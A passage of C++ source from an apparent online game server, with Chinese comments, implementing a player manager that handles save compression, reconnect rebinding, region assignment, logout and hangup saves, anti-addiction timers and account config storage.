    extern BOOL TryEncoding_NilBuffer( const void *src_data, size_t src_size, void *&dst_data, size_t &dst_size );

    // 新侠必定是新版本了，直接发送压缩数据
    LPVOID outData = NULL;
    size_t outSize = 0;
    BOOL result = TryEncoding_NilBuffer( &playerData, sizeof( SFixData ), outData, outSize );
	if (result && (outSize < sizeof(SFixData) - 32))
    {
        // 压缩成功后，帐号的数据还得重新处理过！
        LPDWORD dataBuf = ( LPDWORD )&msg.PlayerData;
        *dataBuf = ( DWORD )outSize;
        memcpy( &dataBuf[1], outData, *dataBuf );

        size_t accSize = strlen( account ) + 1;
        if ( accSize >= 128 )
            return rfalse( 4, 1, "发现异常长度的帐号，可能已经数据越界了！" ), FALSE;

        // 帐号部分对齐，以4字节为单位进行处理
        size_t adSize = ( outSize >> 2 ) + 1;
        LPDWORD accountSize = &dataBuf[ 1 + adSize ];
        *accountSize = ( DWORD )accSize;
        memcpy( &accountSize[1], account, *accountSize );

        size_t segment = ( size_t )&( ( ( SQSaveCharacterMsg* )0 )->PlayerData );

        // 只发送有效部分！
        msg.dwServerId = Globals::GetServerId();
        size_t sendSize = segment + 4 + ( adSize << 2 ) + 4 + accSize;
        if ( !Globals::SendToDBServer( &msg, sendSize ) )
            return FALSE;

        //Globals::UpdatePlayerScore( &playerData );

        return TRUE;
    }

    // 压缩失败后，就只能通过旧的逻辑来进行保存了！
    rfalse( 4, 1, ( result ) ? "数据压缩后大小几乎不变！" : "数据压缩出错！" );

    try
    {
        lite::Serializer slm( msg.streamData, sizeof( msg.streamData ) );
        slm( account );

        // 保存数据
		//三国屏蔽msg.PlayerData = playerData;
        msg.dwServerId = Globals::GetServerId();
		int num = SectionMessageManager::getInstance().evaluateDevidedAmount(sizeof(msg)-slm.EndEdition());
		int id = 0;
		BOOL ret;
		for (int i = 0;i < num;i++)
		{
			SSectionMsg sMsg;
			id = SectionMessageManager::getInstance().devideMessage(i,num,&sMsg,&msg,sizeof(msg) - slm.EndEdition(),id);
			ret = Globals::SendToDBServer(&sMsg,sizeof(SSectionMsg));
			if(!ret)
			{
				return FALSE;
			}
		}
        //if ( !Globals::SendToDBServer( &msg, sizeof(msg) - slm.EndEdition() ) )
           // return FALSE;
    }
    catch ( lite::Xcpt & )
    {
        return FALSE;
    }

    //// 采集当前的钱(返还回数据库)
    //m_DataCollect.AddTotalMoney( true, PlayerData.m_szName, (int)PlayerData.m_dwMoney+(int)PlayerData.m_dwStoreMoney );

    // 最后刷新角色排行榜
    //Globals::UpdatePlayerScore( &playerData );

    return TRUE;
}

BOOL CPlayerManager::RebindAccount(DNID dnidClient, LPCSTR szAccount, DWORD limitedState, LPCSTR idkey, DWORD online, DWORD offline)
{
    // 注意：该函数返回FALSE，是为了表明该账号需要继续到数据库请求数据，而不是说重新绑定函数失败
    // 现在因为区域服务器当机而导致PutIntoRegion失败，结果再次到数据库请求新的数据
    // 是一个严重的数据异常隐患，可能导致复制！
    // scope
	
	{
		for (std::map<DNID, SLinkContextInfo>::iterator it = tempLinkContext.begin(); it != tempLinkContext.end(); ++it)
        {
            // 如果当前账号已经被使用[可能是停留在角色选择界面]，则直接返回TRUE，RebindAccount成功则不会继续往下执行
            if (it->second.account == szAccount)
                return TRUE;
        }
    }

	std::map<std::string, SPlayer>::iterator it = playerCache.find(szAccount);
    if (it == playerCache.end())
        return FALSE;
	//return TRUE; //暂时取消重定向
    // 说明该角色还在线上
    if (it->second.byIsRebinding)
    {
        // 特殊处理，当一个连接处于连接重定向中掉线的话，是可以允许重连的
        // 但是这个时候客户端没有游戏当前的数据，通过给m_bQuestFullData打标记的方法来要求区域服务器给客户端发送初始化数据
        it->second.TempData.m_bQuestFullData = true;
    }

    // 先修改该角色的备份资料
    it->second.byIsLostLink		= true;
    it->second.byIsRebinding	= true;
    it->second.dwRebindSegTime	= timeGetTime();

    // 是否纳入沉迷系统？
	it->second.idkey = idkey ? idkey : "";

    // 重连的情况下不需要考虑目标场景的连接数是否满员
    SPlayer &player = it->second;

    // 防沉迷系统
    player.dwLoginSegment	= (DWORD)time(NULL);	// 记录本次游戏进入时间
    player.limitedState		= limitedState;
    player.offline			= offline;
    player.online			= online;

    sockaddr_in addr;
    ZeroMemory(&addr,sizeof(sockaddr_in));

    if (server.GetDnidAddr(dnidClient, &addr, sizeof(addr)))
        player.ip = inet_ntoa(addr.sin_addr);

    // 按该函数的实际意义来说，不管是否放入场景失败，最终结果一定返回为TRUE
	// 重新绑定时放入场景失败，可能是区域服务器当机而导致的，但因为该角色数据仍然存在，所以不能通过再次获取数据库数据的方式进入游戏
	// 但如果无法放入场景可能导致卡号，那暂时先这样，以后想办法
	Globals::PutIntoRegion( dnidClient, player.account.c_str(), player.dwGlobalID, player.Data.m_CurRegionID, player.dwRegionServerKey);

    return TRUE;
}

BOOL CPlayerManager::AssignPlayer(DNID dnidClient, SFixData *data)
{
	std::map<DNID, SLinkContextInfo>::iterator itLink = tempLinkContext.find(dnidClient);
    if (itLink == tempLinkContext.end())
        return FALSE;

	// 如果此时在登陆数据库上已经存在这个[账号]角色了，则返回失败
    std::map<std::string, SPlayer>::iterator itCheck = playerCache.find(itLink->second.account);
    if (itCheck != playerCache.end())
        return FALSE;

    SPlayer player;

	player.dwGlobalID			= Globals::GetGuid(true);
    player.dwRegionServerKey	= 0;
	player.byIsLostLink			= true;
    player.byIsRebinding		= true;

    player.fixData = *data;
    memset(&player.TempData, 0, sizeof(player.TempData));
	player.Data.m_Name[CONST_USERNAME-1] = 0;
	//player.Data.m_GMLevel	= itLink->second.gmlevel;
	dwt::strcpy(player.Data.m_UPassword, itLink->second.userpass.c_str(), sizeof(player.Data.m_UPassword));

	player.dwNextCheckTime		= timeGetTime();
	player.dwNextCheckExtra		= 0;

    // 防沉迷系统
    player.dwLoginSegment	= (DWORD)time(NULL);			// 记录本次游戏进入时间
    player.limitedState		= itLink->second.limitedState;
    player.offline			= itLink->second.offline;
    player.online			= itLink->second.online;
    player.puid				= itLink->second.puid;
	player.idkey			= itLink->second.idkey;			// 是否纳入沉迷系统？

    player.account = itLink->second.account;
    player.password = itLink->second.password;

    sockaddr_in addr;
    ZeroMemory(&addr,sizeof(sockaddr_in));

    if (server.GetDnidAddr(dnidClient, &addr, sizeof(addr)))
        player.ip = inet_ntoa(addr.sin_addr);

	if (!Globals::PutIntoRegion(dnidClient, player.account.c_str(), player.dwGlobalID, 5,/*player.Data.m_CurRegionID,*/ player.dwRegionServerKey))
    {
		// 这个地方说明消息数据中有错
		if (-1 == player.dwRegionServerKey)
            return FALSE;

        // 将目标对象放入到该对象的出身场景
        /*Globals::SBornPos *bornPos = Globals::GetBornPos(player.Data.m_School);
        if (!bornPos)
            return FALSE;

        player.Data.m_CurRegionID	= bornPos->wRegionID;
        player.Data.m_X				= (bornPos->wPosX << 5) + rand() % bornPos->wRadius;
        player.Data.m_Y				= (bornPos->wPosY << 5) + rand() % bornPos->wRadius;
		player.Data.m_dir			= 0;*/

		if (!Globals::PutIntoRegion(dnidClient, player.account.c_str(), player.dwGlobalID,  5, /*player.Data.m_CurRegionID,*/ player.dwRegionServerKey))
            return FALSE;
    }

	// 将玩家角色加入到cache
	playerCache[player.account] = player;

    // 将LinkContext去掉
    tempLinkContext.erase(dnidClient);

	m_onlineNumber++;	// 临时添加游戏中的在线人数

    return TRUE;
}

BOOL CPlayerManager::RegisterContext(DNID dnid, LPCSTR account, LPCSTR password, LPCSTR userpass, DWORD limitedState, int gmlevel, LPCSTR idkey, DWORD online, DWORD offline, QWORD puid)
{
	if (gmlevel < 0 || gmlevel > 5)
        return FALSE;

	// 这种情况发生的可能是2个链接拥有了相同的dnid，但这不应该！
    if (tempLinkContext.find(dnid) != tempLinkContext.end())
        return FALSE;

	if (account == NULL && password == NULL && userpass == NULL)
        return tempLinkContext.erase(dnid) != 0;

    SLinkContextInfo &temp = tempLinkContext[dnid];
    temp.account		= account;
    temp.password		= password;
    temp.userpass		= userpass;
    temp.gmlevel		= gmlevel;
    temp.doUnbind		= false;
    temp.limitedState	= limitedState;
    temp.online			= online;
    temp.offline		= offline;
	temp.idkey			= idkey ? idkey : "";
    temp.puid			= puid;

    return TRUE;
}

BOOL CPlayerManager::UpdatePlayerData( struct SARefreshPlayerMsg *pMsg )
{
    LPCSTR account = NULL;
    try
    {
        lite::Serialreader sl( pMsg->streamData );
        account = sl();
    }
    catch ( lite::Xcpt & )
    {
        return FALSE;
    }

    std::map< std::string, SPlayer >::iterator it = playerCache.find( account );
    if ( it == playerCache.end() )
        return FALSE;

    SPlayer *pPlayer = &it->second;
   // if ( pPlayer == NULL || pPlayer->dwGlobalID != pMsg->gid ) 
   //     return FALSE;

    // 可能是试玩角色的数据，不需要save;
    if ( memcmp( account, "游客", 4 ) == 0 )
    {
        // 因为是“游客”所以后续的保存都不会起效果，但必要的数据缓存是需要存在的
    }
    else if ( pMsg->storeflag != SARefreshPlayerMsg::ONLY_LOGOUT )
    {
		if (pMsg->fixData.m_dwStaticID == 0 || pMsg->fixData.m_dwStaticID > 0x80000000)
        {
            rfalse( 2, 1, "###""保存的数据%sStaticID有错", account );
            rfalse( 1, 1, "###""保存的数据%sStaticID有错", account );
            return false;
        }
    }

	BYTE prStoreFlag = pPlayer->Data.m_byStoreFlag;
    switch ( pMsg->storeflag )
    {
    case SARefreshPlayerMsg::ONLY_LOGOUT:
        // 账号退出
        PlayerLogout( account, pPlayer->password.c_str(), pPlayer );

        // 角色清除
        ClearPlayerInCache( account );
        break;

    case SARefreshPlayerMsg::ONLY_BACKUP:
        // 备份数据
		pPlayer->fixData = pMsg->fixData;
        break;

    case SARefreshPlayerMsg::BACKUP_AND_SAVE:
        // 备份数据
		pPlayer->fixData = pMsg->fixData;
		pPlayer->fixData = pMsg->fixData;

        // 保存数据
		SavePlayerData(account, pMsg->fixData, SFixProperty::ST_LOGIN);
        break;

    case SARefreshPlayerMsg::SAVE_AND_LOGOUT:
        // 备份数据
		pPlayer->fixData = pMsg->fixData;

        // 账号退出
        PlayerLogout( account, pPlayer->password.c_str(), pPlayer );

        // 保存数据
		if (SavePlayerData(account, pMsg->fixData, SFixProperty::ST_LOGOUT))
        {
            // 角色清除
            ClearPlayerInCache( account );
        }
        break;

    case SARefreshPlayerMsg::BACKUP_AND_FLAG:
        // 备份数据
		pPlayer->fixData = pMsg->fixData;
        pPlayer->TempData.m_IsRegionChange = FALSE;

        // 设断线标志
        pPlayer->byIsLostLink = true;

        // 增设断线重新绑定标志
        pPlayer->byIsRebinding = true;
        pPlayer->dwRebindSegTime = timeGetTime();
        pPlayer->Data.m_byStoreFlag = 0xff;
        break;

    case SARefreshPlayerMsg::SAVE_AND_HANGUP:
        // 基本同BACKUP_AND_FLAG
		pPlayer->fixData = pMsg->fixData;
        pPlayer->TempData.m_IsRegionChange = FALSE;

        pPlayer->byIsLostLink = true;
        pPlayer->byIsRebinding = true;

        //重新设置刷新时间
        pPlayer->dwNextCheckTime = timeGetTime();
        pPlayer->dwNextCheckExtra = timeGetTime() + REFRESHTIME_OFFLINEEXTRA;

        // 因为是挂机，角色必定在游戏中，所以不需要检测超时
        pPlayer->dwRebindSegTime = 0;

        BYTE pot = 0;

        // 目前用m_wScriptID来判断有没有随身功能
//         if ( pPlayer->Data.m_wScriptID !=0 )
//             pot++;

//        if ( pPlayer->TempData.m_dwExtraState & SHOWEXTRASTATE_SALE )
//            pot++;

        // 通知账号服务器，该账号开始挂机
        PlayerHangup( account, pPlayer->password.c_str(), pot, pPlayer );

		// 保存数据
		SavePlayerData(account, pMsg->fixData, SFixProperty::ST_HANGUP);
        pPlayer->Data.m_byStoreFlag = SFixProperty::ST_HANGUP;
        break;
    }

    return TRUE;
}

BOOL CPlayerManager::DoubleUpdatePlayerData( SDoubleSavePlayerMsg *pMsg )
{
	std::map< std::string, SPlayer >::iterator it1, it2;
	it1 = playerCache.find( pMsg->account[0] );
	if ( it1 == playerCache.end() )
		return rfalse( 2, 1, "同步保存时，账号1[%s]不存在", pMsg->account[0] );
	assert( it1->second.dwGlobalID == pMsg->gid[0] );

	if ( pMsg->gid[1] != 0 )
	{
		it2 = playerCache.find( pMsg->account[1] );
		if ( it2 == playerCache.end() )
			return rfalse( 2, 1, "同步保存时，账号2[%s]不存在", pMsg->account[1] );
		assert( it2->second.dwGlobalID == pMsg->gid[1] );
		//三国屏蔽 it2->second.Data = pMsg->data[1];
	}

//三国屏蔽	it1->second.Data = pMsg->data[0];
	return true;
}

LPCSTR CPlayerManager::GetAccountByDnid(DNID dnid)
{
    std::map<DNID, SLinkContextInfo>::iterator itLink = tempLinkContext.find(dnid);
    if ( itLink == tempLinkContext.end() )
        return NULL;

    return itLink->second.account.c_str();
}

LPCSTR CPlayerManager::GetUserPassByDnid( DNID dnid )
{
    std::map< DNID, SLinkContextInfo >::iterator itLink = tempLinkContext.find( dnid );
    if ( itLink == tempLinkContext.end() )
        return NULL;

    return itLink->second.userpass.c_str();
}

BOOL CPlayerManager::DoCheckRebind(DNID dnid, SQCheckRebindMsg *pMsg)
{
    SACheckRebindMsg msg;

    msg.dnidClient	= pMsg->dnidClient;
    msg.gid			= pMsg->gid;

    LPCSTR account = NULL;
    try
    {
        lite::Serialreader sl(pMsg->streamData);
        account = sl();
    }
    catch ( lite::Xcpt & )
    {
        return FALSE;
    }

	msg.dwResult = 1;

	SPlayer *pPlayer = NULL;
	std::map<std::string, SPlayer>::iterator it = playerCache.find(account);
    if (it == playerCache.end())
    {
        // 如果找不到这个对象说明认证失败
        msg.dwResult = 0;
    }
    else
    {
        pPlayer = &it->second;

        if (pPlayer->dwGlobalID != pMsg->gid)
        {
            // 这个是全局ID校验错误的情况
            msg.dwResult = 0;
        }
        else
        {
			DWORD dwIP = 0, dwPort = 0;
            DNID  dnidDest = 0;
            
			if (!Globals::GetServerInfo(pPlayer->dwRegionServerKey, dnidDest, dwIP, dwPort))
            {
                // 找不到目标场景
                msg.dwResult = 0;
            }
        }

        if (msg.dwResult == 1 && pPlayer != NULL)
        {
			// 绑定成功
            pPlayer->byIsLostLink = false;
            pPlayer->byIsRebinding = false;

            if (pPlayer->dwNextCheckExtra != 0)
            {
                pPlayer->dwNextCheckTime	= timeGetTime();
                pPlayer->dwNextCheckExtra	= 0;
                pPlayer->dwRebindSegTime	= 0;
            }
        }
    }

    try
    {
        lite::Serializer slm(msg.streamData, sizeof(msg.streamData));
        slm(account);

        if (msg.dwResult == 1 && pPlayer != NULL && pPlayer->limitedState)
            slm[0](pPlayer->online)(pPlayer->offline);

        if (pPlayer && (pPlayer->puid != 0))
            slm[1](pPlayer->puid);

        if (!Globals::SendToGameServer(dnid, &msg, sizeof(msg) - slm.EndEdition()))
            rfalse(1, 1, "send SACheckRebindMsg fail!!!");

		//这里重新绑定完成，区域服务器应该开启请求玩家数据,这里记录并发处理的玩家数量增加
// 		if (pPlayer)
// 		{
// 			g_dConcurrencyPlayerNum++;
// 			g_dConcurrencyAllPlayerNum++;
// 			playerloginlist[pPlayer->account] = GetTickCount();
// 		}
		
    }
    catch (lite::Xcpt &)
    {
        return FALSE;
    }

    return (msg.dwResult == 1);
}

BOOL CPlayerManager::AccountExist( LPCSTR account )
{
    return ( playerCache.find( account ) != playerCache.end() );
}

BOOL CPlayerManager::GetPlayerData(LPCSTR account, DWORD gid, SFixData *data, SPlayerTempData *tdata)
{
    std::map< std::string, SPlayer >::iterator it = playerCache.find( account );
    if ( it == playerCache.end() )
        return FALSE;

    if ( gid != it->second.dwGlobalID )
        return FALSE;

    *data = it->second.fixData;
    *tdata = it->second.TempData;

    return TRUE;
}

BOOL CPlayerManager::ClearPlayerInCache( LPCSTR account )
{
    if ( playerCache.erase( account ) )
    {
        // 同时也需要通知数据库服务器将该玩家数据解除服务器ID绑定

        // 不再发送取消绑定消息，随意的取消会导致玩家数据无法保存！
        // 况且在调用ClearPlayerInCache前，已经向数据库服务器发送了最后的保存请求了
        // QueryPlayerList( account, NULL, 0 );
        return TRUE;
    }

    return FALSE;
}

BOOL CPlayerManager::GetDnidContext( DNID dnid, LPCSTR &account, LPCSTR &password, LPCSTR &userpass )
{
    std::map< DNID, SLinkContextInfo >::iterator itLink = tempLinkContext.find( dnid );
    if ( itLink == tempLinkContext.end() )
        return FALSE;

    account = itLink->second.account.c_str();
    password = itLink->second.password.c_str();
    userpass = itLink->second.userpass.c_str();

    return TRUE;
}

BOOL CPlayerManager::SetPlayerServerKey( LPCSTR account, DWORD ID )
{
    SPlayer *p = FindPlayer( account );
    if ( p == NULL )
        return FALSE;

    p->dwRegionServerKey = ID;
    return TRUE;
}

BOOL CPlayerManager::ActivateLinkContextWithRebind( DNID dnid )
{
    std::map< DNID, SLinkContextInfo >::iterator itLink = tempLinkContext.find( dnid );
    if ( itLink == tempLinkContext.end() )
        return FALSE;

    itLink->second.doUnbind = true;

    return TRUE;
}

void CPlayerManager::DisplayInfo()
{
    int count = 0;
    for ( std::map< std::string, SPlayer >::iterator it = playerCache.begin(); it != playerCache.end(); it ++ )
    {
        if ( it->first.length() < 4 )
            continue;

        if ( memcmp( it->first.c_str(), "游客", 4 ) != 0 )
            continue;

        count ++;
    }

    rfalse( 2, 1, "当前缓存中的人数/游客数/停留在角色选择界面的人数 ： %d/%d/%d",
        playerCache.size(), count, tempLinkContext.size() );
}

BOOL CPlayerManager::SavePlayerConfig( struct SQSavePlayerConfigInfo *pMsg )
{
// 	SQLSavePlayerConfig psavemsg;
// 	psavemsg.serverId = Globals::GetServerId();
// 	dwt::strcpy(psavemsg.streamData,pMsg->streamData,MAX_ACCOUNT);
// 	dwt::strcpy(psavemsg.playerconfig,pMsg->playerconfig,1024);

	std::vector<SCplayerConfig>::iterator ite = playercon.begin();
	while(ite != playercon.end())
	{
		SCplayerConfig CplayerConfig = *ite;
		if (dwt::strcmp(CplayerConfig.straccount.c_str(),pMsg->streamData,MAX_ACCOUNT) == 0){
			return FALSE;
		}
		ite++;
	}
	SCplayerConfig CplayerCon;
	CplayerCon.straccount = pMsg->streamData;
	CplayerCon.strconfig = pMsg->playerconfig;
//	dwt::strcpy(CplayerCon.straccount,pMsg->streamData,MAX_ACCOUNT);
	//dwt::strcpy(CplayerCon.strconfig,pMsg->playerconfig,1024);
	playercon.push_back(CplayerCon);
	return TRUE;
/*	return Globals::SendToDBServer(&psavemsg,sizeof(SQLSavePlayerConfig));*/
	
}

BOOL CPlayerManager::SavePlayerConfig( LPCSTR szAccount, LPCSTR szconfig )
{
	SQSavePlayerConfigInfo PlayerConfigmsg;
	dwt::strcpy(PlayerConfigmsg.streamData,szAccount,MAX_ACCOUNT);
	dwt::strcpy(PlayerConfigmsg.playerconfig,szconfig,1024);
	return SavePlayerConfig(&PlayerConfigmsg);
}

BOOL CPlayerManager::SendPlayerConfig( LPCSTR szAccount )
{
	std::vector<SCplayerConfig>::iterator ite = playercon.begin();
	while(ite != playercon.end())
	{
		SCplayerConfig CplayerConfig = *ite;
		if (dwt::strcmp(CplayerConfig.straccount.c_str(),szAccount,MAX_ACCOUNT) == 0)
		{
			 SQLSavePlayerConfig psavemsg;
		     psavemsg.serverId = Globals::GetServerId();
			 dwt::strcpy(psavemsg.streamData,CplayerConfig.straccount.c_str(),MAX_ACCOUNT);
			 dwt::strcpy(psavemsg.playerconfig,CplayerConfig.strconfig.c_str(),1024);
			 return Globals::SendToDBServer(&psavemsg,sizeof(SQLSavePlayerConfig));
		}
		ite++;
	}
	return FALSE;
}

BOOL CPlayerManager::CleanPlayerConfig( LPCSTR szAccount )
{
	std::vector<SCplayerConfig>::iterator ite = playercon.begin();
	while(ite != playercon.end())
	{
		SCplayerConfig CplayerConfig = *ite;
		if (dwt::strcmp(CplayerConfig.straccount.c_str(),szAccount,MAX_ACCOUNT) == 0)
		{
			playercon.erase(ite);
			return TRUE;
		}
		ite++;
	}
	return FALSE;
}
